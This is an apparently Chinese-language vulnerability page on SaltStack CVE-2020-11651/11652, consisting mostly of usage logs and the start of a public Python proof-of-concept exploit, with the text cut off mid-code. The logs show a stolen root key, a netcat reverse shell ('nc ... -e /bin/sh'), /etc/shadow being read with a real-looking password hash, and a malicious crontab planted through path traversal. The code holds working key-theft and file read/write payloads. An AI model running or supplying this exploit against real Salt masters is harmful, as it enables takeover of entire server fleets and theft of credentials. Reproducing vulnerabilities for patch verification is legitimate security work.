<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs1773D91F{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-11651saltstack远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-11651</span><span class="csECDA2D3">）</span><span class="csDE05BCC">SaltStack</span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">SaltStack &lt; 2019.2.4<br/>SaltStack &lt; 3000.2</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="usage"><span class="csD1E291E2">Usage</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">默认操作（不带参数）是获取给定主机的密钥</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Salt version: 3000.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ ] This version of salt is vulnerable! Check results below</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking salt-master (192.168.115.130:4506) status... ONLINE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking if vulnerable to CVE-2020-11651...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root@kalimah:~/salt#</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在主机上执行任意命令</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec &quot;nc 127.0.0.1 4444 -e /bin/sh&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Salt version: 3000.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ ] This version of salt is vulnerable! Check results below</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking salt-master (192.168.115.130:4506) status... ONLINE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking if vulnerable to CVE-2020-11651...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Successfully scheduled job: 20200504153851746472</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root@kalimah:~/salt#</span></p><p class="cs40DD2BC9"><span class="cs8926E06">The same, but on all minions:</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec-all=&quot;apt-get upgrade -y&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Salt version: 3000.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ ] This version of salt is vulnerable! Check results below</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking salt-master (192.168.115.130:4506) status... ONLINE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking if vulnerable to CVE-2020-11651...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[!] Lester, is this what you want? Hit ^C to abort.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Attemping to execute &#39;apt-get upgrade -y&#39; on all minions connected to 192.168.115.130</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Successfully submitted job to all minions.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root@kalimah:~/salt#</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">任意文件读取</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Salt version: 2019.2.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ ] This version of salt is vulnerable! Check results below</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking salt-master (192.168.115.130:4506) status... ONLINE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking if vulnerable to CVE-2020-11651...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Attemping to read /etc/shadow from 192.168.115.130</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">daemon:*:17785:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bin:*:17785:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sys:*:17785:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sync:*:17785:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">games:*:17785:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">man:*:17785:0:99999:7:::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[...]</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以使用</span><span class="cs9FB05234">--upload src</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">--upload dest</span><span class="cs9C1B1871">上传文件。注意目标必须是相对路径</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">root@kalimah:~/salt# &nbsp;python2 exploit.py --upload-src evil.crontab --upload-dest ../../../../../../var/spool/cron/crontabs/root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Salt version: 2019.2.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ ] This version of salt is vulnerable! Check results below</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking salt-master (127.0.0.1:4506) status... ONLINE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Checking if vulnerable to CVE-2020-11651...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] Destination path must be relative</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Attemping to upload evil.crontab to ../../../../../../var/spool/cron/crontabs/root on 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[ ] Wrote data to file /srv/salt/../../../../../../var/spool/cron/crontabs/root</span></p><h3 class="cs868C439D">
			<a name="requirements"><span class="csD1E291E2">Requirements</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs1773D91F"><span class="cs8926E06">Python 2 or 3</span></li><li class="cs1773D91F"><span class="cs8926E06">Salt (</span><span class="cs9FB05234">pip3 install salt</span><span class="cs8926E06">)</span></li></ul>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit for CVE-2020-11651 and CVE-2020-11652</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This exploit is based on this checker script:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># https://github.com/rossengeorgiev/salt-security-backports</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">from __future__ import absolute_import, print_function, unicode_literals</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import datetime</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import os</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import os.path</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import salt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import salt.version</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import salt.transport.client</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import salt.exceptions</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def init_minion(master_ip, master_port):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;minion_config = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;transport&#39;: &#39;zeromq&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;pki_dir&#39;: &#39;/tmp&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;: &#39;root&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;log_level&#39;: &#39;debug&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;master_ip&#39;: master_ip,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;master_port&#39;: master_port,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;auth_timeout&#39;: 5,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;auth_tries&#39;: 1,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;master_uri&#39;: &#39;tcp://{0}:{1}&#39;.format(master_ip, master_port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return salt.transport.client.ReqChannel.factory(minion_config, crypt=&#39;clear&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># --- check funcs ----</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check_salt_version():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Salt version: {}&quot;.format(salt.version.__version__))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;vi = salt.version.__version_info__</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;if (vi &lt; (2019, 2, 4) or (3000,) &lt;= vi &lt; (3000, 2)):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check_connection(master_ip, master_port, channel):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Checking salt-master ({}:{}) status... &quot;.format(master_ip, master_port), end=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;# connection check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;channel.send({&#39;cmd&#39;:&#39;ping&#39;}, timeout=2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except salt.exceptions.SaltReqTimeoutError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;OFFLINE&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ONLINE&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check_CVE_2020_11651(channel):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Checking if vulnerable to CVE-2020-11651... &quot;, end=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;# try to evil</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send({&#39;cmd&#39;: &#39;_prep_auth_info&#39;}, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except salt.exceptions.SaltReqTimeoutError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;YES&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ERROR&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;finally:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if rets:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root_key = rets[2][&#39;root&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return root_key</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;return None</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (read_token)... &quot;, end=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;# try read file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;get_token&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;arg&#39;: [],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;token&#39;: top_secret_file_path,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except salt.exceptions.SaltReqTimeoutError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;YES&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ERROR&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if debug:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(rets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;NO&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (read)... &quot;, end=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;# try read file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;wheel&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;file_roots.read&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;path&#39;: top_secret_file_path,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;saltenv&#39;: &#39;base&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except salt.exceptions.SaltReqTimeoutError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;TIMEOUT&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ERROR&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if debug:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(rets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if rets[&#39;data&#39;][&#39;return&#39;]:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;YES&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;NO&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check_CVE_2020_11652_write1(debug, channel, root_key):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (write1)... &quot;, end=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;# try read file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;wheel&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;file_roots.write&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;path&#39;: &#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;data&#39;: &#39;evil&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;saltenv&#39;: &#39;base&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except salt.exceptions.SaltReqTimeoutError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;TIMEOUT&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;ERROR&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;raise</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if debug:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(rets)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pp(rets)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if rets[&#39;data&#39;][&#39;return&#39;].startswith(&#39;Wrote&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.remove(&#39;/tmp/salt_CVE_2020_11652&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except OSError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Maybe?&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;YES&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;NO&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check_CVE_2020_11652_write2(debug, channel, root_key):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (write2)... &quot;, end=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;sys.stdout.flush()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;# try read file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;msg = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;key&#39;: root_key,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;cmd&#39;: &#39;wheel&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;fun&#39;: &#39;config.update_config&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;file_name&#39;: &#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;yaml_contents&#39;: &#39;evil&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;saltenv&#39;: &#39;base&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rets = channel.send(msg, timeout=3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except salt.exceptions.SaltReqTimeoutError:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;TIMEOUT&quot;)</span><span 